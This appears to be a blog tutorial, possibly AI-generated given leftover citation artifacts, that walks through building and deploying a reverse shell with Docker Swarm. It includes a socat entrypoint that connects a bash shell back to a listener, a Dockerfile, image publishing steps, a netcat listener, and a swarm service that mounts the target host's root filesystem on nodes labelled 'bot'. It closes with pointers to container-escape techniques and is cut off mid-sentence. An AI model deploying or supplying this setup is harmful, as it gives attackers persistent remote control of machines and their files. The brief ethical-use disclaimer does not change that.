# Mastering Stealth: Deploying a Reverse Shell with Docker Swarm Like a Pro

Reverse shells are indispensable tools for penetration testers, enabling remote access and control during authorized security assessments. This guide demonstrates how to set up a reverse shell using Docker Swarm, leveraging containerized environments for precision and scalability.  
**Disclaimer:** This setup is strictly for ethical use in lab environments or with explicit permission. Unauthorized use is illegal.

---

## **What You'll Need**
1. A **Command-and-Control (C2)** server with Docker installed (Ubuntu preferred).
2. A **target client machine** ready to join the Docker Swarm.
3. Basic familiarity with Docker commands and networking concepts.
4. A GitHub account with access to GitHub Container Registry (GHCR).

---

## **1. Initializing the C2 Server**

Docker Swarm provides an efficient way to orchestrate containerized environments, serving as the backbone of our reverse shell setup.

1. **Install Docker on the C2 Server:**  
   If Docker isn’t already installed, follow the official [Docker installation guide](https://docs.docker.com/engine/install/).

2. **Initialize Docker Swarm:**  
    Run the following command on your C2 server:
    ```bash
    docker swarm init
    ```

    Example output:
    ```plaintext
    Swarm initialized: current node (mha0yryh5oaxkutyaqd5n58mi) is now a manager.
    To add a worker to this swarm, run the following command:

        docker swarm join --token SWMTKN-1-abc123def456ghijklmnopqrstuvwxyz 192.168.1.100:2377
    ```

    - **Manager Node:** Controls the Docker Swarm.
    - **Worker Node:** Executes tasks as part of the Swarm.

3. **Save the Join Token:**  
    Copy the `docker swarm join` command. You’ll use it to add client machines to the Swarm.

---

## **2. Create the Reverse Shell Docker Image**

Containers provide lightweight, isolated environments, making them perfect for penetration testing.

1. **Set Up a Workspace:**  
    Create and navigate to a directory for your project:
    ```bash
    mkdir reverse-shell
    cd reverse-shell
    ```

2. **Write the Dockerfile:**  
    The `Dockerfile` defines the container’s environment. Create a file named `Dockerfile` with the following content:
    ```dockerfile
    FROM ubuntu:latest

    RUN apt-get update && apt-get install -y bash socat

    COPY entrypoint.sh /entrypoint.sh
    RUN chmod +x /entrypoint.sh

    ENTRYPOINT ["/entrypoint.sh"]
    ```

3. **Write the Entry Point Script:**  
    Create a file named `entrypoint.sh` to handle the reverse shell connection:
    ```bash
    #!/bin/bash

    if [ -z "$REMOTE_IP" ] || [ -z "$REMOTE_PORT" ]; then
      echo "Error: REMOTE_IP and REMOTE_PORT environment variables must be set."
      exit 1
    fi

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$REMOTE_IP:$REMOTE_PORT
    ```

4. **Login to GitHub Container Registry:**  
    Replace `ghp_XXXX` with your GitHub Personal Access Token (PAT):
    ```bash
    export CR_PAT="ghp_XXXX"
    echo $CR_PAT | docker login ghcr.io -u <github-username> --password-stdin
    ```

5. **Build and Push the Docker Image:**  
    Use `docker buildx` to create a multi-platform image and push it to GHCR:
    ```bash
    docker buildx build --platform linux/amd64,linux/arm64 -t ghcr.io/<github-username>/reverse-shell-ubuntu:latest --push .
    ```

6. **Make the Image Public:**  
    Visit your GitHub Packages overview, locate the `reverse-shell-ubuntu` package, and set its visibility to **Public**.

---

## **3. Prepare the Client Machine**

1. **Install Docker:**  
    Follow the [Docker installation guide](https://docs.docker.com/engine/install/) to set up Docker on the target machine.

2. **Join the Docker Swarm:**  
    Use the `docker swarm join` command copied earlier:
    ```bash
    docker swarm join --token SWMTKN-1-abc123def456ghijklmnopqrstuvwxyz 192.168.1.100:2377
    ```

    The client is now part of the Swarm and ready to execute tasks.

---

## **4. Set Up the Reverse Shell on the C2 Server**

1. **Start a Netcat Listener:**  
    On your C2 server, listen for incoming connections:
    ```bash
    nc -lvnp 1337
    ```

2. **Label the Target Node:**  
    Identify the client node using:
    ```bash
    docker node ls
    ```

    Assign a label to the node for targeted service deployment:
    ```bash
    docker node update --label-add role=bot <node-id>
    ```

3. **Deploy the Reverse Shell Service:**  
    Run the following command to create the reverse shell:
    ```bash
    docker service create \
      --name reverse-shell-ubuntu \
      --mode global \
      --env REMOTE_IP=192.168.1.100 \
      --env REMOTE_PORT=1337 \
      --mount type=bind,source=/,target=/host_root \
      --constraint 'node.labels.role == bot' \
      ghcr.io/<github-username>/reverse-shell-ubuntu:latest
    ```

---

## **5. Verify the Connection**

Switch to your Netcat listener terminal. If everything is configured correctly, you should see an active reverse shell connection from the target client.

---

## **What’s Next?**

Once you have a reverse shell, consider the following post-exploitation techniques for further exploration or testing:

### **1. Container Escaping**
- **Overview:** Attempt to break out of the container to gain access to the host system.
- **Techniques:**
  - **Mounted Docker Socket:** If the Docker socket is mounted inside the container, you can communicate with the Docker daemon to create new containers with elevated privileges. :contentReference[oaicite:0]{index=0}
  - **Privileged Containers:** Containers run with the `--privileged` flag have extended capabilities, potentially allowing host access. :contentReference[oaicite:1]{index=1}
- **Resources:**
  - [Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
  - [Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

### **2. Chroot Environments**
- **Overview:** Use `chroot` to change the apparent root directory for the current running process, which can be used to mimic the container's environment.
- **Techniques:**
  - **Binding the Host Filesystem:** Mount the host filesystem within the container
::contentReference[oaicite:2]{index=2}
 
